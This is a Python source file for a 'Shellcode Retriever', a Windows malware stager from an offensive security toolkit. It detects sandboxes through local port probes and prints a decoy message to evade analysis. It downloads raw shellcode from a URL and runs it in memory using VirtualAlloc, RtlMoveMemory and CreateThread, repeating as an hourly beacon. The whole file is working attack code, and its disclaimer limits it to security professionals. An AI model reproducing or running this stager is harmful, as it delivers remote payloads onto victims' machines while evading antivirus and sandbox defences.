#!/usr/bin/env python
'''
    Shellcode Retriever

    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    
    Copyright (C) 2013, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.

'''

import socket
import sys
import urllib2
import ctypes
import time
import signal


#Set to True if you want to beacon every X seconds based
#on timesleep
retry = True
#time to sleep in seconds
timesleep = 3600 
opener = urllib2.build_opener()


def sandbox_check():
    """
    Quick sandbox check for additional av evasion.
    And a message to throw the user off.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sandbox = True
    try:
        s.connect(('127.0.0.1', 445))
        s.close()
        sandbox = False
    except:
        pass

    if sandbox == True:
        try:
            s.connect(('127.0.0.1', 135))
            s.close()
        except:
            #Message to throw the user off:
            print "Clybase platform checker 2012\nYour platform is:", sys.platform
            sys.exit(0)
        

def allocate_exe(shellcode):
    """ 
    ctypes VritualAlloc, MoveMem, and CreateThread 
    From http://www.debasish.in/2012_04_01_archive.html
    """
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
 
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
 
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                        buf,
                                        ctypes.c_int(len(shellcode)))
 
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))
 
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))


def get_and_execute(openurl):
    info = opener.open(openurl)
    shellcode = info.read()
    shellcode = bytearray(shellcode)
    allocate_exe(shellcode)


def main():
    sandbox_check()
    #set a url below or leave as '' to manually enter
    openurl = ''
    if openurl == '':
        openurl = raw_input("Give me a url: ")
    try:
        get_and_execute(openurl)
        while retry is True:
            time.sleep(timesleep)
            get_and_execute(openurl)
            
    except Exception, e:
        #print str(e)
        pass
    
if __name__ == "__main__":
        main()
